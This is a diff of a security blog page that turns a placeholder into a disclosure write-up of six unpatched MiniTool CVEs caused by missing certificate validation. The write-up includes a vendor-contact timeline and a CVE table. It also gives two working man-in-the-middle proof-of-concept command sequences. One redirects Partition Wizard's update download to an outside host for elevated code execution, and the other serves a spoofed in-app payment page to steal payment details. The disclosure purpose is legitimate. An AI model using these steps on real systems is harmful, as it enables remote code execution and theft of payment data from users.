@@ -3,10 +3,10 @@
 
 <head>
 
-  <meta property="og:title" content="CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356 PLACEHOLDER" />
-  <meta property="og:description" content="This is a placholder for CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356. Details will follow." />
-  <meta property="og:image" content="https://0dr3f.github.io/images/placeholder.png" />
-  <meta property="og:url" content="https://0dr3f.github.io/2023/08/13/CVEPLACEHOLDER/" />
+  <meta property="og:title" content="How Flawed Certificate Handling Leads to Critical Vulnerabilities" />
+  <meta property="og:description" content="A short post describing 6 unpatched vulnerabilities and how improper certificate handling can lead to critical vulnerabilities" />
+  <meta property="og:image" content="https://0dr3f.github.io/images/post_02.png" />
+  <meta property="og:url" content="https://0dr3f.github.io/2023/09/10/CVE/" />
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:creator" content="@0Dr3f" />
 
@@ -14,10 +14,10 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356 PLACEHOLDER</title>
-  <meta name='description' content='This is a placholder for CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356. Details will follow.'>
+  <title>How Flawed Certificate Handling Leads to Critical Vulnerabilities</title>
+  <meta name='description' content='A short post describing 6 unpatched vulnerabilities and how improper certificate handling can lead to critical vulnerabilities'>
 
-  <link rel="canonical" href="/2023/08/13/CVEPLACEHOLDER/">
+  <link rel="canonical" href="/2023/09/10/CVE/">
   <link rel="alternate" type="application/rss+xml" title="0Dr3f" href="/feed.xml">
 
   <!-- Fonts -->
@@ -69,6 +69,14 @@
     <a href="/" class="nav__link">Home</a>
   </li>
   
+    
+  
+    
+      
+      <li class="nav__item">
+        <a href="/cve/" class="nav__link">Public CVEs</a>
+      </li>
+      
     
   
     
@@ -135,6 +143,14 @@
     <a href="/" class="nav__link">Home</a>
   </li>
   
+    
+  
+    
+      
+      <li class="nav__item">
+        <a href="/cve/" class="nav__link">Public CVEs</a>
+      </li>
+      
     
   
     
@@ -237,7 +253,7 @@
       
       <div class="col col-6 col-t-12">
         <div class="image-box">
-          <img class="post-image lazy" data-src="/images/placeholder.png" alt="CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356 PLACEHOLDER">
+          <img class="post-image lazy" data-src="/images/post_02.png" alt="How Flawed Certificate Handling Leads to Critical Vulnerabilities">
         </div>
       </div>
       
@@ -249,14 +265,14 @@
             <span class="post__minutes">
               
               
-                1 min read
+                5 min read
               
               <time class="post__date"
-                datetime="2023-08-13T16:01:35+02:00">Aug 13, 2023</time>
+                datetime="2023-09-10T00:00:00+02:00">Sep 10, 2023</time>
             </span>
           </div>
         
-          <h2 class="post__title">CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356 PLACEHOLDER</h2>
+          <h2 class="post__title">How Flawed Certificate Handling Leads to Critical Vulnerabilities</h2>
         
           <div class="post__bottom">
         
@@ -291,18 +307,166 @@
   <article class="post animate">
 
     <div class="post__content">
-      <p>This is a placeholder for CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356. We are still trying to work with the vendor in order to mitigate these issues.</p>
+      <h2 id="introduction">Introduction</h2>
+<p>In this short blog post, we’ll quickly delve into the critical yet seemingly overlooked issue of flawed certificate handling within applications. What started as a mere curiosity on my end quickly unveiled six unpatched vulnerabilities, illustrating how seemingly minor oversights can lead to serious security risks, including PII loss and Remote Code Execution.</p>
+<h2 id="disclosure-disclaimer">Disclosure Disclaimer</h2>
+<p>While looking into this issue, 6 vulnerabilities were discovered in Minitool’s software. Multiple attempts were made to reach out to Minitool in order to resolve these issues, but all were ignored. As of today (<strong>10-09-2023</strong>), these vulnerabilities remain unpatched and end-users of the mentioned software are at risk. For full transparency I’m including a timeline containing contact attempts. Along with the date at which full reports were shared with the vendor.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Date</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>14-06-2023</td>
+      <td>Initial contact attempt with the affected vendor through support@minitool.com</td>
+    </tr>
+    <tr>
+      <td>23-06-2023</td>
+      <td>Second contact attempt through support@minitool.com and twitter (@minitool_)</td>
+    </tr>
+    <tr>
+      <td>01-07-2023</td>
+      <td>Third contact attempt through support@minitool.com</td>
+    </tr>
+    <tr>
+      <td>18-07-2023</td>
+      <td>6 reports containing details of the vulnerabilities along with mitigation recommendations were shared with support@minitool.com</td>
+    </tr>
+    <tr>
+      <td>10-09-2023</td>
+      <td>Publication of this vulnerability details</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="why-certificates-matter">Why Certificates Matter</h2>
+<p>In today’s digital landscape, the concept of trust is, if not the most crucial, certainly one of the most crucial aspects of online interactions. From securing our financial transactions to protecting our personal data, we rely on technologies built to validate and encrypt these connections.</p>
+
+<p><span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">A key mechanism preventing attackers from stealing your banking information through a Man-in-the-Middle (MitM) attack is a certificate, verified against a ‘trusted authority’.</span></p>
+
+<p>Applications bear the responsibility of managing these certificates and conducting the necessary checks. While most of us are familiar with browsers that signal certificate trustworthiness using clear indicators like red or green locks and warning messages, similar signaling within applications is rarely seen. Surprisingly, even the most popular bug bounty platforms often leave MitM scenarios out of scope, potentially leaving end-users at risk.</p>
+
+<h2 id="cases-of-improper-certificate-handling">Cases of Improper Certificate Handling</h2>
+
+<blockquote>
+  <p>Trust, but verify</p>
+
+  <p><cite>Ronald Reagan</cite></p>
+</blockquote>
+
+<p>To evaluate instances of improper certificate handling, one must establish a MitM position. This can be easily achieved locally by configuring an Access Point. For our specific tests, we leveraged the Windows hosts file (located at <code class="language-plaintext highlighter-rouge">C:\\Windows\\System32\\drivers\\etc\\hosts</code>) to manually modify the domain resolutions.</p>
+<h3 id="cve-2023-38352---rce-through-insecure-updates">CVE-2023-38352 - RCE through insecure updates</h3>
+<p>The first application that caught my eye was <strong>Minitool Partition Wizard</strong>. Upon intercepting the traffic directed to <em>www.partitionwizard.com</em>, we quickly identify an update configuration file being requested.</p>
+
+<p><img src="/images/Pasted%20image%2020230910165919.png" alt="" /></p>
+
+<p>If we now change the update binary download location to our own server and enable the <em>ForceDownloadNewVersion</em> flag, any time someone opens the Partition Wizard application below version 12.9 will download and execute our binary with <strong>high</strong> elevation.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir checking-update
+curl -L https://partitionwizard.com/checking-update/verconfig-v11-free.txt -o ./checking-update/verconfig-v11-free.txt
+
+sed -e 's/SoftwareVersion=120800/SoftwareVersion=120900/g' \
+-e 's/SoftwareVersionText=12.8/SoftwareVersionText=12.9/g' \
+-e 's/ForceDownloadNewVersion=0/ForceDownloadNewVersion=1/g' \
+-e 's/Lastversion-download-url-1=.*$/Lastversion-download-url-1=https:\/\/0dr3f.github.io\/bin\/calc.exe/g' \
+-i checking-update/verconfig-v11-free.txt
+
+python3 -m http.server 80
+</code></pre></div></div>
+
+<p><img src="/images/Pasted%20image%2020230910165444.png" alt="" /></p>
+
+<p><img src="/images/Pasted%20image%2020230910165457.png" alt="" /></p>
+<h3 id="cve-2023-38353---pii-leaking-through-insecure-payment-system">CVE-2023-38353 - PII Leaking through insecure payment system</h3>
+
+<p>The second application we will look at is <strong>Minitool Power Data Recovery</strong>. This application has a built-in subscription system that basically renders <em>www.minitool.com</em> from within the application.</p>
+
+<p><img src="/images/Pasted%20image%2020230910191434.png" alt="" /></p>
+
+<p><img src="/images/Pasted%20image%2020230910191731.png" alt="" /></p>
+
+<p>If we intercept traffic send towards <em>www.minitool.com</em>, we can quickly identify the page requested for the subscription page.</p>
+
+<p><img src="/images/Pasted%20image%2020230910185044.png" alt="" /></p>
+
+<p>We can now create our own payment page, recreate the original one, or proxy all data send to our payment page to the original one in order to steal payment information.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir -p promotions/pdr
+echo "&lt;meta http-equiv=\"Refresh\" content=\"0; url='https://0dr3f.github.io/policy/'\" /&gt;" &gt; promotions/pdr/buy-inner-software.php
+php -S 0.0.0.0:80
+</code></pre></div></div>
+
+<p><img src="/images/Pasted%20image%2020230910191344.png" alt="" /></p>
+
+<h3 id="cve-2023-38351-6">CVE-2023-38351-6</h3>
+<p>In less than a day of examining various applications, I uncovered the following CVEs. Upon discovery of these CVEs I decided to stop looking and instead contact the vendor to initiate resolving these issues.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>CVE</th>
+      <th>Type</th>
+      <th>Software</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>CVE-2023-38351</td>
+      <td>Missing SSL Certificate Validation</td>
+      <td>MiniTool Partition Wizard 12.8</td>
+      <td>MiniTool Partition Wizard 12.8 contains an insecure installation mechanism that allows attackers to achieve remote code execution through a man in the middle attack.</td>
+    </tr>
+    <tr>
+      <td>CVE-2023-38352</td>
+      <td>Missing SSL Certificate Validation</td>
+      <td>MiniTool Partition Wizard 12.8</td>
+      <td>MiniTool Partition Wizard 12.8 contains an insecure update mechanism that allows attackers to achieve remote code execution through a man in the middle attack.</td>
+    </tr>
+    <tr>
+      <td>CVE-2023-38353</td>
+      <td>Missing SSL Certificate Validation</td>
+      <td>MiniTool Power Data Recovery 11.6</td>
+      <td>MiniTool Power Data Recovery 11.6 contains an insecure in-app payment system that allows attackers to steal highly sensitive information through a man in the middle attack.</td>
+    </tr>
+    <tr>
+      <td>CVE-2023-38354</td>
+      <td>Missing SSL Certificate Validation</td>
+      <td>MiniTool Shadow Maker 4.1</td>
+      <td>MiniTool Shadow Maker 4.1 contains an insecure installation process that allows attackers to achieve remote code execution through a man in the middle attack.</td>
+    </tr>
+    <tr>
+      <td>CVE-2023-38355</td>
+      <td>Missing SSL Certificate Validation</td>
+      <td>MiniTool Movie Maker 7.0</td>
+      <td>MiniTool Movie Maker 7.0 contains an insecure installation process that allows attackers to achieve remote code execution through a man in the middle attack.</td>
+    </tr>
+    <tr>
+      <td>CVE-2023-38356</td>
+      <td>Missing SSL Certificate Validation</td>
+      <td>MiniTool Power Data Recovery 11.6</td>
+      <td>MiniTool Power Data Recovery 11.6 contains an insecure installation process that allows attackers to achieve remote code execution through a man in the middle attack.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="summary">Summary</h2>
+<p>In this short post we examined several applications that improperly handle certificates and the severe implications this can have for end users. It further highlights how the Man-in-the-Middle attack vector seems to be an overlooked area in bug bounty programs, despite its potential to lead to critical vulnerabilities, including PII loss and Remote Code Execution.</p>
 
 
     </div>
 
     <div class="post__share">
       <div class="share__list">
-        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=/2023/08/13/CVEPLACEHOLDER/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=/2023/09/10/CVE/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
 
-        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=CVE-2023-38351,%20CVE-2023-38352,%20CVE-2023-38353,%20CVE-2023-38354,%20CVE-2023-38355,%20CVE-2023-38356%20PLACEHOLDER&url=/2023/08/13/CVEPLACEHOLDER/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=How%20Flawed%20Certificate%20Handling%20Leads%20to%20Critical%20Vulnerabilities&url=/2023/09/10/CVE/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
 
-        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=/2023/08/13/CVEPLACEHOLDER/&amp;media=/images/placeholder.png&amp;description=CVE-2023-38351,%20CVE-2023-38352,%20CVE-2023-38353,%20CVE-2023-38354,%20CVE-2023-38355,%20CVE-2023-38356%20PLACEHOLDER" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
+        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=/2023/09/10/CVE/&amp;media=/images/post_02.png&amp;description=How%20Flawed%20Certificate%20Handling%20Leads%20to%20Critical%20Vulnerabilities" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
       </div>
     </div>
 
@@ -440,20 +604,20 @@
     
     <div class="recent-posts">
       
-      <a class="recent-posts__image" href="/2023/08/13/CVEPLACEHOLDER/"><img class="lazy" data-src="/images/placeholder.png" alt="CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356 PLACEHOLDER"></a>
+      <a class="recent-posts__image" href="/2023/09/10/CVE/"><img class="lazy" data-src="/images/post_02.png" alt="How Flawed Certificate Handling Leads to Critical Vulnerabilities"></a>
       
       <div class="recent-posts__content">
         <div class="article__meta">
           <span class="article__minutes">
             
             
-              1 min read
+              5 min read
             
           </span>
           <time class="article__date"
-            datetime="2023-08-13T16:01:35+02:00">Aug 13, 2023</time>
+            datetime="2023-09-10T00:00:00+02:00">Sep 10, 2023</time>
         </div>
-        <h4 class="recent-posts__title"><a href="/2023/08/13/CVEPLACEHOLDER/">CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356 PLACEHOLDER</a></h4>
+        <h4 class="recent-posts__title"><a href="/2023/09/10/CVE/">How Flawed Certificate Handling Leads to Critical Vulnerabilities</a></h4>
         <div class="article__bottom">
           <div class="article__author">
             <a href="/contact/" aria-label="0Dr3f"><img class="article__author-image lazy" data-src="/images/0Dr3f_logo.png" alt="0Dr3f's Picture"></a>
